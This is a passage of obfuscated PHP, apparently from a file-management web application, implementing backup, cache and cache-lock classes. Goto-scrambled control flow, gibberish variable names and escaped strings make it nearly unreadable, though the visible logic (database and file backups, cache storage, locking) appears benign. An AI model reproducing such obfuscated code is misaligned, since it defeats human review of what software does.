Model($Aœ¢Ğì¸ò[687])->listData($eŠ‘îñ¿œï); Model($Aœ¢Ğì¸ò[687])->checkConfig($e¨†À®ˆ§¤); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[“][672])->findByName(self::$name); } return self::$option; } public static function set($CÎí¥ùæ¯ñ) { $cĞ¨ºĞÄÙŠ =& $_SERVER[“]; $BêÅ¸àÜ¨Ë = self::get(); foreach ($CÎí¥ùæ¯ñ as $eòø¹µŒô => $eÍ®ºò¼ªñ) { $e½ÙÚ©ê×æ = explode($cĞ¨ºĞÄÙŠ[91], $eòø¹µŒô); $aÂ¸’‰íˆ = count($e½ÙÚ©ê×æ); switch ($aÂ¸’‰íˆ) { case 1: $BêÅ¸àÜ¨Ë[$e½ÙÚ©ê×æ[0]] = $eÍ®ºò¼ªñ; break; case 2: $BêÅ¸àÜ¨Ë[$e½ÙÚ©ê×æ[0]][$e½ÙÚ©ê×æ[1]] = $eÍ®ºò¼ªñ; break; case 3: $BêÅ¸àÜ¨Ë[$e½ÙÚ©ê×æ[0]][$e½ÙÚ©ê×æ[1]][$e½ÙÚ©ê×æ[2]] = $eÍ®ºò¼ªñ; break; } } Model($cĞ¨ºĞÄÙŠ[672])->update($BêÅ¸àÜ¨Ë[$cĞ¨ºĞÄÙŠ[367]], $BêÅ¸àÜ¨Ë); self::$option = $BêÅ¸àÜ¨Ë; return self::$option; } public function keep() { $Aà®²¼„Ê =& $_SERVER[“]; $A™­»«œÛº = self::get(); if ($A™­»«œÛº[$Aà®²¼„Ê[281]][$Aà®²¼„Ê[677]][$Aà®²¼„Ê[673]] == $Aà®²¼„Ê[83]) { return; } $this->backupKeep($A™­»«œÛº); self::set(array($Aà®²¼„Ê[688] => 1)); } private function backupKeep($cÀ÷ÂÉ®çô) { goto Cç•ä‹¾; Cç•ä‹¾: $BÎ¬ÇğËÃ  =& $_SERVER[“]; $açŠÙ»ˆ‰ó = Model($BÎ¬ÇğËÃ [672])->listData(); if (empty($açŠÙ»ˆ‰ó)) { return; } goto fíŠØİœ½œ; fíŠØİœ½œ: $BìÑ©Øå = 0; $eñË¸äƒ• = array(); foreach ($açŠÙ»ˆ‰ó as $B£¼Œ—Ù”Ä) { if ($BìÑ©Øå >= 7) { break; } $eñË¸äƒ•[] = $B£¼Œ—Ù”Ä[$BÎ¬ÇğËÃ [28]]; $BìÑ©Øå++; } goto F”“Ÿ¤œ§‡; F”“Ÿ¤œ§‡: for ($BìÑ©Øå = 0; $BìÑ©Øå < 12; $BìÑ©Øå++) { $eñË¸äƒ•[] = date($BÎ¬ÇğËÃ [689], strtotime("\55{$BìÑ©Øå}\x20\155\157\156\164\x68\163")); } $eñË¸äƒ• = array_unique($eñË¸äƒ•); foreach ($açŠÙ»ˆ‰ó as $B£¼Œ—Ù”Ä) { if (!empty($B£¼Œ—Ù”Ä[$BÎ¬ÇğËÃ [28]]) && in_array($B£¼Œ—Ù”Ä[$BÎ¬ÇğËÃ [28]], $eñË¸äƒ•)) { continue; } Model($BÎ¬ÇğËÃ [672])->remove($B£¼Œ—Ù”Ä[$BÎ¬ÇğËÃ [367]]); $BŒíø©³Ô³ = "\x7b\151\157\x3a{$cÀ÷ÂÉ®çô[$BÎ¬ÇğËÃ [675]]}\x7d\x2f\144\141\x74\x61\142\141\163\145\x2f\142\x61\143\153\x75\x70\137{$B£¼Œ—Ù”Ä[$BÎ¬ÇğËÃ [28]]}"; IO::remove($BŒíø©³Ô³, !1); } goto a–ÅåŞ‘Óº; a–ÅåŞ‘Óº: } public function db() { goto dˆÇí™¨Èá; cˆŒ¯¾Š«¸: $FåÖï®ä×½ = new BackupDb(); if (!$FåÖï®ä×½->index()) { return !1; } self::set(array($E¯ÄÖ£ÓÛ[690] => 1)); goto c«ÂÇ®ÍÀâ; c«ÂÇ®ÍÀâ: return !0; goto böô·ÅÎ„»; dˆÇí™¨Èá: $E¯ÄÖ£ÓÛ =& $_SERVER[“]; $B¨Ùâ¿ê = self::get(); if ($B¨Ùâ¿ê[$E¯ÄÖ£ÓÛ[281]][$E¯ÄÖ£ÓÛ[678]][$E¯ÄÖ£ÓÛ[673]] == $E¯ÄÖ£ÓÛ[83]) { return !0; } goto cˆŒ¯¾Š«¸; böô·ÅÎ„»: } public function dbFile() { goto få›®‚ª¶ö; E©òÚƒ×Š: return !0; goto fœ…îõ´; få›®‚ª¶ö: $AøÔ¿ÊåÅ§ =& $_SERVER[“]; $aè‰™˜°Ş• = self::get(); if ($aè‰™˜°Ş•[$AøÔ¿ÊåÅ§[281]][$AøÔ¿ÊåÅ§[681]][$AøÔ¿ÊåÅ§[673]] == $AøÔ¿ÊåÅ§[83]) { return !0; } goto bÔ¹ïÑé…Ú; bÔ¹ïÑé…Ú: $aÒì˜¶Ç†— = new BackupDbFile(); if (!$aÒì˜¶Ç†—->index()) { return !1; } self::set(array($AøÔ¿ÊåÅ§[691] => 1)); goto E©òÚƒ×Š; fœ…îõ´: } public function file() { $F—…áÑë·¹ =& $_SERVER[“]; $d°ä’êÃÈ± = self::get(); if ($d°ä’êÃÈ±[$F—…áÑë·¹[281]][$F—…áÑë·¹[167]][$F—…áÑë·¹[673]] == $F—…áÑë·¹[83]) { return !0; } if (!isset($d°ä’êÃÈ±[$F—…áÑë·¹[676]]) || $d°ä’êÃÈ±[$F—…áÑë·¹[676]] == $F—…áÑë·¹[470]) { $Dˆ±£õ‡‡˜ = new BackupFile(); if (!$Dˆ±£õ‡‡˜->index()) { return !1; } } self::set(array($F—…áÑë·¹[692] => 1, $F—…áÑë·¹[673] => 1)); return !0; } } goto CÇ¥¤·Šƒ‰; EÁñÆ¸Ø¸¾: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto FÏ™ÀøŸÑµ; cÀ‘¯êÉ¬¯: $f„ôÍß¿Œğ = $GLOBALS[$c¨Ã’Ñöä[6]][$c¨Ã’Ñöä[337]]; $D¢Áä‘øà‘ = $f„ôÍß¿Œğ[$f„ôÍß¿Œğ[$c¨Ã’Ñöä[738]]]; $Cõ¨’½†œÕ = $f„ôÍß¿Œğ[$c¨Ã’Ñöä[739]]; goto aà˜´Ìº¨Ñ; aà˜´Ìº¨Ñ: switch ($f„ôÍß¿Œğ[$c¨Ã’Ñöä[738]]) { case $c¨Ã’Ñöä[17]: self::$handle = Model($c¨Ã’Ñöä[740]); break; case $c¨Ã’Ñöä[741]: self::$handle = new CacheRedis($D¢Áä‘øà‘, $Cõ¨’½†œÕ); break; case $c¨Ã’Ñöä[742]: self::$handle = new CacheMemcached($D¢Áä‘øà‘, $Cõ¨’½†œÕ); break; case $c¨Ã’Ñöä[167]: self::$handle = new CacheFile($D¢Áä‘øà‘, $Cõ¨’½†œÕ); break; default: break; } return self::$handle; goto A¥‹”ÇĞŸĞ; FÏ™ÀøŸÑµ: $c¨Ã’Ñöä =& $_SERVER[“]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto cÀ‘¯êÉ¬¯; A¥‹”ÇĞŸĞ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cÈ²İõ–â) { if (is_array($cÈ²İõ–â) || is_object($cÈ²İõ–â)) { $cÈ²İõ–â = json_encode($cÈ²İõ–â); } $cÈ²İõ–â = rawurlencode($cÈ²İõ–â); return KOD_SITE_ID . $_SERVER[“][70] . $cÈ²İõ–â; } public static function get($BŞ¯çÅ±œİ) { $A¢­‹Ï¯È¤ = self::key($BŞ¯çÅ±œİ); if (!isset(self::$memoryCache[$A¢­‹Ï¯È¤])) { $c™›ì§ï¹‘ = self::init()->get($A¢­‹Ï¯È¤); self::$memoryCache[$A¢­‹Ï¯È¤] = unserialize($c™›ì§ï¹‘); } return self::$memoryCache[$A¢­‹Ï¯È¤]; } public static function set($E‰§é³ÌÊ, $b†®˜µÆŞŠ, $BÃ™‰É“¥ = false) { goto AšÒŸˆòèÃ; Fê¼éÁ‘Ÿ: CacheLock::unlock($E‰§é³ÌÊ); return $Eœ÷–ì¢Ò‘; goto DÔë…ğÛÚÖ; DêŸÜê½„: CacheLock::lock($E‰§é³ÌÊ); $Eœ÷–ì¢Ò‘ = self::init()->set($eêÚŠÈÉò, serialize($b†®˜µÆŞŠ), $BÃ™‰É“¥); self::$memoryCache[$eêÚŠÈÉò] = $b†®˜µÆŞŠ; goto Fê¼éÁ‘Ÿ; AšÒŸˆòèÃ: $eêÚŠÈÉò = self::key($E‰§é³ÌÊ); if (isset(self::$memoryCache[$eêÚŠÈÉò]) && self::$memoryCache[$eêÚŠÈÉò] === $b†®˜µÆŞŠ) { return !0; } if ($BÃ™‰É“¥ === 0) { self::$memoryCache[$eêÚŠÈÉò] = $b†®˜µÆŞŠ; return !0; } goto DêŸÜê½„; DÔë…ğÛÚÖ: } public static function remove($D†¾ÖÜ²—) { goto a „ „™§; a „ „™§: $EŠ··Ú•Æœ = self::key($D†¾ÖÜ²—); unset(self::$memoryCache[$EŠ··Ú•Æœ]); self::clearTimeout(); goto DÏ± ñ“ùÇ; b‚º¦âòÜ: return $eÙØ“¢§«‡; goto Fç•è«ÙÑ; DÏ± ñ“ùÇ: CacheLock::lock($D†¾ÖÜ²—); $eÙØ“¢§«‡ = self::init()->remove($EŠ··Ú•Æœ); CacheLock::unlock($D†¾ÖÜ²—); goto b‚º¦âòÜ; Fç•è«ÙÑ: } public static function clearMemory($DÓİ«Ê¨‚£ = false) { if ($DÓİ«Ê¨‚£) { $DÓİ«Ê¨‚£ = self::key($DÓİ«Ê¨‚£); unset(self::$memoryCache[$DÓİ«Ê¨‚£]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[“][743])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[“][744])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($då‡”Î¬’ğ, $F¹‰ÃÉ´“) { $FŠøÈæ„²… =& $_SERVER[“]; $this->cachePath = $då‡”Î¬’ğ[$FŠøÈæ„²…[75]]; $this->prefix = $FŠøÈæ„²…[745]; $this->cacheTime = $F¹‰ÃÉ´“; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bË‡òùÀŒ…) { $CÇÈ‚Ãàí§ =& $_SERVER[“]; $bË‡òùÀŒ… = str_replace(array($CÇÈ‚Ãàí§[746], $CÇÈ‚Ãàí§[93], $CÇÈ‚Ãàí§[69]), $CÇÈ‚Ãàí§[747], $bË‡òùÀŒ…); return $this->cachePath . $CÇÈ‚Ãàí§[748] . $bË‡òùÀŒ… . $CÇÈ‚Ãàí§[749]; } public function set($aÛÆ¹ëŒÈæ, $eòÁœ¾Ñ‚‰, $C­òğòóø÷ = false) { $D‘í¬Ì­Ã = $this->getFile($aÛÆ¹ëŒÈæ); if (file_put_contents($D‘í¬Ì­Ã, $this->prefix . $eòÁœ¾Ñ‚‰, LOCK_EX)) { return !0; } @unlink($D‘í¬Ì­Ã); return !1; } public function get($cá”³Æ°¿») { $c¼Ø¼ğ×˜Â = $this->getFile($cá”³Æ°¿»); if (file_exists($c¼Ø¼ğ×˜Â) && filemtime($c¼Ø¼ğ×˜Â) < time() - $this->cacheTime) { @unlink($c¼Ø¼ğ×˜Â); return !1; } $dà¥ÀÊ…™¸ = @file_get_contents($c¼Ø¼ğ×˜Â); return substr($dà¥ÀÊ…™¸, strlen($this->prefix)); } public function remove($FˆİÛÀÛ‡¥) { $DêâÜóæ­ƒ = $this->getFile($FˆİÛÀÛ‡¥); return @unlink($DêâÜóæ­ƒ); } public function deleteAll() { $BÈà¼¦‚×ô =& $_SERVER[“]; $B†ã×Ùãƒ› = scandir($this->cachePath); foreach ($B†ã×Ùãƒ› as $FÉƒÜŠ±ÉŠ) { $B›”’¼ĞŸí = $this->cachePath . $FÉƒÜŠ±ÉŠ; if (strpos($B›”’¼ĞŸí, $BÈà¼¦‚×ô[749]) && strpos($B›”’¼ĞŸí, $BÈà¼¦‚×ô[750])) { @unlink($B›”’¼ĞŸí); } } } public function clearTimeout() { $E‹›Œå…ïá =& $_SERVER[“]; $dÜÆâ‹‚„Ï = scandir($this->cachePath); foreach ($dÜÆâ‹‚„Ï as $aŒ“ŸÌï) { $dƒÄ‹´¹± = $this->cachePath . $aŒ“ŸÌï; if (strpos($dƒÄ‹´¹±, $E‹›Œå…ïá[749]) && strpos($dƒÄ‹´¹±, $E‹›Œå…ïá[750]) && filemtime($dƒÄ‹´¹±) < time() - $this->cacheTime) { @unlink($dƒÄ‹´¹±); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto dªõë”ÊÙ; dªõë”ÊÙ: $d¹”Óî¿×° =& $_SERVER[“]; if (self::$handle) { return self::$handle; } $F›¨óŒ”„ = $GLOBALS[$d¹”Óî¿×°[6]][$d¹”Óî¿×°[337]]; goto f™“ãã˜À; f™“ãã˜À: self::$timeout = $F›¨óŒ”„[$d¹”Óî¿×°[751]] ? $F›¨óŒ”„[$d¹”Óî¿×°[751]] : 10; $dì‰–¦ïŸ = _get($GLOBALS[$d¹”Óî¿×°[6]], $d¹”Óî¿×°[752]); $Aã—â™­ÊÒ = $F›¨óŒ”„[$d¹”Óî¿×°[738]] ? $F›¨óŒ”„[$d¹”Óî¿×°[738]] : $d¹”Óî¿×°[167]; goto d†éùãÇÄ†; d†éùãÇÄ†: if ($Aã—â™­ÊÒ == $d¹”Óî¿×°[17] && $dì‰–¦ïŸ == $d¹”Óî¿×°[9]) { $Aã—â™­ÊÒ = $d¹”Óî¿×°[167]; } switch ($Aã—â™­ÊÒ) { case $d¹”Óî¿×°[741]: self::$handle = new CacheLockRedis(); break; case $d¹”Óî¿×°[742]: self::$handle = new CacheLockMemcached(); break; case $d¹”Óî¿×°[17]: self::$handle = new CacheLockDatabase(); break; case $d¹”Óî¿×°[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto bìî£ãîê; bìî£ãîê: } private static function key($c¼ô£Ö§è) { return $_SERVER[“][753] . Cache::key($c¼ô£Ö§è); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($b©²ÒêùÏ = '') { self::$errorMsg = $b©²ÒêùÏ; } public static function lockGlobal($a¹¢’¶âÜ, $a´¶ŞØÓ¶) { return self::lock($a¹¢’¶âÜ, $a´¶ŞØÓ¶, !0); } public static function lock($d·éà¯ØØ, $dõõÉŸ–ºå = false, $B»ÜÕÚß­÷ = false) { goto c®óá‹Ø¿ù; FŸÏÙàõØ¯: $dõõÉŸ–ºå = $dõõÉŸ–ºå ? $dõõÉŸ–ºå : self::$timeout; $c·Ş‹…ñ¬™ = $C§Æš°±´->lock($Dœ„Í…Ÿ‡Á, $dõõÉŸ–ºå); if (!$c·Ş‹…ñ¬™) { $F¥Ù‘çØ½‰ = $D¡¬«•©­¿[754] . $dõõÉŸ–ºå . $D¡¬«•©­¿[67] . self::$errorMsg . $D¡¬«•©­¿[67] . get_caller_msg(); $FëØ³Á‰¢Ñ = "\x4c\157\143\153\x20\x61\143\164\x69\157\156\72\40{$Dœ„Í…Ÿ‡Á}\x20\164\x69\155\x65\157\165\164\x2c\157\166\145\x72\x20{$dõõÉŸ–ºå}\x20\x73"; $FëØ³Á‰¢Ñ = self::$errorMsg ? self::$errorMsg : $E·›óŸË²§; write_log($F¥Ù‘çØ½‰, $D¡¬«•©­¿[755]); show_json($FëØ³Á‰¢Ñ, !1); } goto fšéèÖÃ£; fšéèÖÃ£: if (!$B»ÜÕÚß­÷) { self::$lockItem[$Dœ„Í…Ÿ‡Á] = !0; } return $c·Ş‹…ñ¬™; goto eì®¡Ğõ­—; c®óá‹Ø¿ù: $D¡¬«•©­¿ =& $_SERVER[“]; $C§Æš°±´ = self::init(); $Dœ„Í…Ÿ‡Á = self::key($d·éà¯ØØ); goto FŸÏÙàõØ¯; eì®¡Ğõ­—: } public static function lockGet($F¼´¸É¥òÊ) { $c¼íè†Ùî = self::key($F¼´¸É¥òÊ); if (self::$lockItem[$c¼íè†Ùî]) { return self::$lockItem[$c¼íè†Ùî]; } return self::init()->lockGet($c¼íè†Ùî); } public static function unlock($EŒÁÀÏÛìİ) { $Dã¡§¬Ì¯¥ = self::key($EŒÁÀÏÛìİ); self::$lockItem[$Dã¡§¬Ì¯¥] = null; return self::init()->unlock($Dã¡§¬Ì¯¥); } public static function unlockRuntime() { $b’È°¸–¹ =& $_SERVER[“]; $FìÙ²Û‚ˆÉ = self::init(); $b÷§ê¢…–ö = !1; foreach (self::$lockItem as $F‹¸„ŞÑ²› => $eÚæï¥î”») { if (!$eÚæï¥î”») { continue; } $FìÙ²Û‚ˆÉ->unlock($F‹¸„ŞÑ²›); if (!$b÷§ê¢…–ö) { $b÷§ê¢…–ö = !0; write_log($b’È°¸–¹[756] . $F‹¸„ŞÑ²› . $b’È°¸–¹[67] . get_caller_msg(), $b’È°¸–¹[755]); continue; } write_log($b’È°¸–¹[756] . $F‹¸„ŞÑ²›, $b’È°¸–¹[755]); } } } goto D¶ä²İ’Î„; CÇ¥¤·Šƒ‰: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto FÔŠÓàç‚ñ; C…³ô•¿‘¤: foreach ($F‚ß‚¥Éãª as $D‰‘¤‘š·Á) { $bÙùæ— ™¾ = $D»ñ¤»×”ß . $D‰‘¤‘š·Á . $F†ÆãçĞÁá[701]; $F”Ã¬¶×– = null; if ($D‰‘¤‘š·Á == $F†ÆãçĞÁá[702] && (!isset($EŞÎã©­×‡[$F†ÆãçĞÁá[676]]) || $EŞÎã©­×‡[$F†ÆãçĞÁá[676]] == $F†ÆãçĞÁá[470])) { $F”Ã¬¶×– = self::$io; } $e‘°â•Ûàõ += $b‰œƒ‰İ…‘->sqlFromDb($D‰‘¤‘š·Á, $bÙùæ— ™¾, $F‡ ÜÑïÎ‡, $F”Ã¬¶×–); } $F‡ ÜÑïÎ‡->end(); $Cß–®ƒ¯ = array($F†ÆãçĞÁá[703] => $DºÌ¾©ÇÊø, $F†ÆãçĞÁá[690] => 1, $F†ÆãçĞÁá[704] => $e‘°â•Ûàõ, $F†ÆãçĞÁá[705] => $e‘°â•Ûàõ); goto E¸ÀÚ…ëİ‡; cá“‰Å÷Šã: $F‚ß‚¥Éãª = array_diff($F‚ß‚¥Éãª, array($F†ÆãçĞÁá[694], $F†ÆãçĞÁá[695])); foreach ($F‚ß‚¥Éãª as $D‰‘¤‘š·Á) { $E‡å‹™“Ò += $b‰œƒ‰İ…‘->model($D‰‘¤‘š·Á)->count(); } $F‡ ÜÑïÎ‡ = new Task($F†ÆãçĞÁá[696], $F†ÆãçĞÁá[697], $E‡å‹™“Ò, LNG($F†ÆãçĞÁá[698]) . $F†ÆãçĞÁá[699] . LNG($F†ÆãçĞÁá[700])); goto C…³ô•¿‘¤; CÌ¢ê¬ª¤Ò: mk_dir($D»ñ¤»×”ß); $E‡å‹™“Ò = $e‘°â•Ûàõ = 0; $F‚ß‚¥Éãª = $b‰œƒ‰İ…‘->db()->getTables(); goto cá“‰Å÷Šã; AòĞ”Şˆ“Ğ: self::$name = $EŞÎã©­×‡[$F†ÆãçĞÁá[28]]; $A¡ªù±¿¬Å = $GLOBALS[$F†ÆãçĞÁá[6]][$F†ÆãçĞÁá[17]]; $DºÌ¾©ÇÊø = $this->_dbType($A¡ªù±¿¬Å); goto e©¢“·Òƒ˜; E¸ÀÚ…ëİ‡: Backup::set($Cß–®ƒ¯); return !0; goto D¤ã®»µç; e©¢“·Òƒ˜: $b‰œƒ‰İ…‘ = new DbManage($A¡ªù±¿¬Å, $DºÌ¾©ÇÊø); $D»ñ¤»×”ß = TEMP_FILES . $F†ÆãçĞÁá[693] . self::$name . $F†ÆãçĞÁá[8]; del_dir($D»ñ¤»×”ß); goto CÌ¢ê¬ª¤Ò; FÔŠÓàç‚ñ: $F†ÆãçĞÁá =& $_SERVER[“]; $EŞÎã©­×‡ = Backup::get(); self::$io = $EŞÎã©­×‡[$F†ÆãçĞÁá[675]]; goto AòĞ”Şˆ“Ğ; D¤ã®»µç: } private function _dbType($DÊ¤«©‚Úä) { goto A¬±ö³ğÚù; A¬±ö³ğÚù: $D¦¦¢×Úâ =& $_SERVER[“]; $DÊ¤«©‚Úä = array_change_key_case($DÊ¤«©‚Úä); $BïëñŸçø² = $DÊ¤«©‚Úä[$D¦¦¢×Úâ[706]]; goto DƒÏãºº‹; fòîáÁÌ¨ë: return $BïëñŸçø²; goto E·ƒ×Û¹ÔÜ; DƒÏãºº‹: if ($BïëñŸçø² == $D¦¦¢×Úâ[707]) { $eòÑÉŸ´¢ = explode($D¦¦¢×Úâ[4], $DÊ¤«©‚Úä[$D¦¦¢×Úâ[708]]); $BïëñŸçø² = $eòÑÉŸ´¢[0]; } $fë“åïˆÑÃ = array($D¦¦¢×Úâ[709] => $D¦¦¢×Úâ[9], $D¦¦¢×Úâ[710] => $D¦¦¢×Úâ[711]); if (isset($fë“åïˆÑÃ[$BïëñŸçø²])) { $BïëñŸçø² = $fë“åïˆÑÃ[$BïëñŸçø²]; } goto fòîáÁÌ¨ë; E·ƒ×Û¹ÔÜ: } } class BackupDbFile { public function __construct() { } public function index() { goto CğéğˆğÁ“; CÓ³ŒÅˆ›È: $D¿ƒ£‘ö¨¨ = new TaskFileTransfer($E‘ãœ‡­Œ[712], $E‘ãœ‡­Œ[697], 0, LNG($E‘ãœ‡­Œ[698]) . $E‘ãœ‡­Œ[412] . LNG($E‘ãœ‡­Œ[700]) . $E‘ãœ‡­Œ[713]); $D¿ƒ£‘ö¨¨->addPath($fó ©ÉÂ»¦); $F’óİÛ§øÛ = IO::infoWithChildren($fó ©ÉÂ»¦); goto eÕÙõ®±Ä¦; BŠØ¦‹†“Ô: $D¿ƒ£‘ö¨¨->end(); Backup::set(array($E‘ãœ‡­Œ[717] => $F’óİÛ§øÛ[$E‘ãœ‡­Œ[77]])); return !0; goto FÀÇöß˜«–; CğéğˆğÁ“: $E‘ãœ‡­Œ =& $_SERVER[“]; $F»â÷ææ± = Backup::get(); $DõĞ§›¶ï = $F»â÷ææ±[$E‘ãœ‡­Œ[28]]; goto dï³†œ Éµ; dï³†œ Éµ: $fó ©ÉÂ»¦ = TEMP_FILES . "\x62\141\143\153\x75\x70\x5f{$DõĞ§›¶ï}\x2f"; $e×²Ú®ğñÎ = "\173\151\x6f\x3a{$F»â÷ææ±[$E‘ãœ‡­Œ[675]]}\175\57\x64\x61\164\141\x62\141\x73\x65\57"; IO::mkdir($e×²Ú®ğñÎ . "\142\141\x63\153\x75\x70\x5f{$DõĞ§›¶ï}\x2f"); goto CÓ³ŒÅˆ›È; eÍ¤Ô…Šì: $a—Ó‚Õ¯è = CONTROLLER_DIR . $E‘ãœ‡­Œ[716]; IO::copy($C¡ÁÓ³•, $e×²Ú®ğñÎ . "\142\141\x63\153\x75\x70\137{$DõĞ§›¶ï}\x2f"); IO::copy($a—Ó‚Õ¯è, $e×²Ú®ğñÎ . "\142\141\x63\x6b\165\x70\x5f{$DõĞ§›¶ï}\57"); goto BŠØ¦‹†“Ô; eÕÙõ®±Ä¦: Backup::set(array($E‘ãœ‡­Œ[714] => $F’óİÛ§øÛ[$E‘ãœ‡­Œ[77]])); IO::move($fó ©ÉÂ»¦, $e×²Ú®ğñÎ); $C¡ÁÓ³• = CONTROLLER_DIR . $E‘ãœ‡­Œ[715]; goto eÍ¤Ô…Šì; FÀÇöß˜«–: } } class BackupFile { public function __construct() { } public function index() { goto aÌ«¤±ôïğ; eßƒÃ˜ÛØß: $cƒªõßÚéò = !0; $eå–êÓ‡¢Ã = $this->storeIds(); $FóĞäİœÉ± = 1; goto ağ„ŸêÒ‘; E°¢å¼÷ÍÂ: $bÇä§ã–ìã = $cƒªõßÚéò ? 1 : 0; $aê÷…ŒëÍÍ = array($_SERVER[“][734] => 1, $_SERVER[“][449] => time(), $_SERVER[“][692] => $bÇä§ã–ìã, $_SERVER[“][731] => $aÑ†¬¢”Šä, $_SERVER[“][723] => $DºíİÛº¶ã, $_SERVER[“][722] => $ağ‡Ù÷œ‹¶); if ($C½ÈÀ¥¹É) { $aê÷…ŒëÍÍ[$_SERVER[“][732]] = $eÌœÕÔö»‰; $aê÷…ŒëÍÍ[$_SERVER[“][733]] = $B’¨ÓŸÊ’–; } goto bĞóÓÑì¬Ğ; A“¢ğ Ãèï: $f¨½ö—æõ->task[$_SERVER[“][682]] = $DºíİÛº¶ã; $aê÷…ŒëÍÍ = array($_SERVER[“][722] => $ağ‡Ù÷œ‹¶, $_SERVER[“][723] => $DºíİÛº¶ã); Backup::set($aê÷…ŒëÍÍ); goto eßƒÃ˜ÛØß; bØ‘Òãë: $ağ‡Ù÷œ‹¶ = (int) Model($_SERVER[“][702])->where($FÂñÖ‹¤¿˜)->count($_SERVER[“][419]); $DºíİÛº¶ã = (int) Model($_SERVER[“][702])->where($FÂñÖ‹¤¿˜)->sum($_SERVER[“][77]); $f¨½ö—æõ = new TaskFileTransfer($_SERVER[“][720], $_SERVER[“][697], $ağ‡Ù÷œ‹¶, LNG($_SERVER[“][698]) . $_SERVER[“][699] . LNG($_SERVER[“][721])); goto A“¢ğ Ãèï; BŸ«ÊİÑĞ±: $B’¨ÓŸÊ’– = $eÌœÕÔö»‰ = 0; do { $a¸§îƒ¨ã = $_SERVER[“][724]; $b÷—šë‰ª¾ = Model($_SERVER[“][702])->where($FÂñÖ‹¤¿˜)->field($a¸§îƒ¨ã)->order($_SERVER[“][725])->selectPage($Eëäã£ÇÉê, $FóĞäİœÉ±); $a§²ÕÜêòå = !empty($b÷—šë‰ª¾[$_SERVER[“][354]]) ? $b÷—šë‰ª¾[$_SERVER[“][354]] : array(); foreach ($a§²ÕÜêòå as $DÊª…Œ–‹å) { goto Fæ™ÙùÆ‰¼; Aªñ–Æƒ‹ß: $aÅãöò‹å += $DÊª…Œ–‹å[$_SERVER[“][77]]; $eÌœÕÔö»‰ += 1; $B’¨ÓŸÊ’– += $DÊª…Œ–‹å[$_SERVER[“][77]]; goto cœ¸Šß•­; cœ¸Šß•­: if ($aÅãöò‹å >= 1024 * 1024 * 100) { $aê÷…ŒëÍÍ = array($_SERVER[“][731] => $aÑ†¬¢”Šä, $_SERVER[“][732] => $eÌœÕÔö»‰, $_SERVER[“][733] => $B’¨ÓŸÊ’–); Backup::set($aê÷…ŒëÍÍ); $aÅãöò‹å = $C½ÈÀ¥¹É = 0; } goto A´Ú”È¢ì; Fæ™ÙùÆ‰¼: if (!$this->_fileExist($DÊª…Œ–‹å, $F‹¯ª÷È, $eå–êÓ‡¢Ã)) { $ağ‡Ù÷œ‹¶ -= 1; $DºíİÛº¶ã -= (int) $DÊª…Œ–‹å[$_SERVER[“][77]]; write_log("\146\x69\x6c\x65\40\156\x6f\x74\40\x65\x78\151\163\x74\56\146\151\x6c\x65\x49\x44\x3a{$DÊª…Œ–‹å[$_SERVER[“][419]]}\54\x20\x70\141\x74\x68\x3a{$DÊª…Œ–‹å[$_SERVER[“][75]]}", $_SERVER[“][726]); continue; } $e÷“á¥ù¿ = $DÊª…Œ–‹å[$_SERVER[“][75]]; $cãØŒˆ’š = "\x7b\x69\x6f\x3a{$Eˆ§å…é“ƒ[$_SERVER[“][675]]}\x7d" . substr($e÷“á¥ù¿, strlen("\x7b\151\x6f\72{$DÊª…Œ–‹å[$_SERVER[“][727]]}\x7d")); goto DŸ¦¡‚Ö©×; DŸ¦¡‚Ö©×: if (IO::exist($cãØŒˆ’š)) { $f¨½ö—æõ->updateFileEnd($DÊª…Œ–‹å[$_SERVER[“][28]], $DÊª…Œ–‹å[$_SERVER[“][77]]); } else { $cãØŒˆ’š = get_path_father($cãØŒˆ’š); IO::mkdir($cãØŒˆ’š); if (!IO::copy($e÷“á¥ù¿, $cãØŒˆ’š, $_SERVER[“][728])) { write_log($_SERVER[“][729] . $e÷“á¥ù¿ . $_SERVER[“][730] . $cãØŒˆ’š . $_SERVER[“][478], $_SERVER[“][697]); $cƒªõßÚéò = !1; break; } } $aÑ†¬¢”Šä = $DÊª…Œ–‹å[$_SERVER[“][419]]; $C½ÈÀ¥¹É += 1; goto Aªñ–Æƒ‹ß; A´Ú”È¢ì: } $EŞÚÍ»¨¥Ê = count($a§²ÕÜêòå); $FóĞäİœÉ±++; } while ($EŞÚÍ»¨¥Ê == $Eëäã£ÇÉê); $f¨½ö—æõ->end(); goto E°¢å¼÷ÍÂ; ağ„ŸêÒ‘: $Eëäã£ÇÉê = 1000; $aÅãöò‹å = $C½ÈÀ¥¹É = 0; $F‹¯ª÷È = array(); goto BŸ«ÊİÑĞ±; aÌ«¤±ôïğ: $Eˆ§å…é“ƒ = Backup::get(); $aÑ†¬¢”Šä = $Eˆ§å…é“ƒ[$_SERVER[“][281]][$_SERVER[“][167]][$_SERVER[“][419]]; $FÂñÖ‹¤¿˜ = array($_SERVER[“][420] => array($_SERVER[“][718], $aÑ†¬¢”Šä), $_SERVER[“][719] => array($_SERVER[“][319], $Eˆ§å…é“ƒ[$_SERVER[“][675]])); goto bØ‘Òãë; bĞóÓÑì¬Ğ: Backup::set($aê÷…ŒëÍÍ); $this->_fileFilter($F‹¯ª÷È); return !0; goto C¿³ƒ¯¢²Á; C¿³ƒ¯¢²Á: } private function _fileExist($DÀ°öÀ™ê, &$c‘¢¡¼«—, $a…†“»’ì) { goto F™ğƒº‹î; B†ª¤­ø: $c‘¢¡¼«— = array_merge($c‘¢¡¼«—, array_to_keyvalue($a¯Ã¼„ç«£, $eÆÄùÊ›¾†[33], $eÆÄùÊ›¾†[419])); return !1; goto cõÈæ“ôËª; F™ğƒº‹î: $eÆÄùÊ›¾† =& $_SERVER[“]; 